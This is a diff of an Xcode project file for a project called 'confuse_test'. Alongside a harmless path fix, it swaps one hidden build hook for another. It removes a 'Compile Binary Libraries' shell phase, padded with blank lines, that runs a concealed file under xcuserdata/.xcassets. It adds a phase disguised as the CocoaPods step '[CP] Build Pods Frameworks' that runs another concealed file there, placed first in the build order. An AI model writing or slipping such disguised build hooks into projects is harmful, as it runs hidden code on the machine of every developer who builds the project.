@@ -249,7 +249,7 @@
 		71E3607025629739003C3264 /* number3.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = number3.png; sourceTree = "<group>"; };
 		71E3607125629739003C3264 /* number1.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = number1.png; sourceTree = "<group>"; };
 		71E3607225629739003C3264 /* number2.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = number2.png; sourceTree = "<group>"; };
-		71E3993725E7935F000570F6 /* SwiftNestedTypes.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = SwiftNestedTypes.swift; path = /Users/yjs/Desktop/confuse_test/confuse_test/swift/SwiftNestedTypes.swift; sourceTree = "<absolute>"; };
+		71E3993725E7935F000570F6 /* SwiftNestedTypes.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SwiftNestedTypes.swift; sourceTree = "<group>"; };
 		71E5944A2578C992007739FC /* TestXibView.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = TestXibView.xib; sourceTree = "<group>"; };
 		71F526EA25903B6C00650E3A /* CppTemplate.cpp */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.cpp.cpp; path = CppTemplate.cpp; sourceTree = "<group>"; };
 		71F526EB25903B6C00650E3A /* CppTemplate.hpp */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.cpp.h; path = CppTemplate.hpp; sourceTree = "<group>"; };
@@ -762,7 +762,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 718B95182508930A00C1DB77 /* Build configuration list for PBXNativeTarget "confuse_test" */;
 			buildPhases = (
-				2ADD64CE046ED966C0AAC43A /* Compile Binary Libraries */,
+				96FFE460191F8DE356AAC43A /* [CP] Build Pods Frameworks */,
 				017C6F975BCA5CBDFD04A9AB /* [CP] Check Pods Manifest.lock */,
 				718B94FB2508930900C1DB77 /* Sources */,
 				718B94FC2508930900C1DB77 /* Frameworks */,
@@ -879,50 +879,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	2ADD64CE046ED966C0AAC43A /* Compile Binary Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Binary Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
-		};
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		017C6F975BCA5CBDFD04A9AB /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -944,6 +900,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		96FFE460191F8DE356AAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
 		};
 /* End PBXShellScriptBuildPhase section */
 
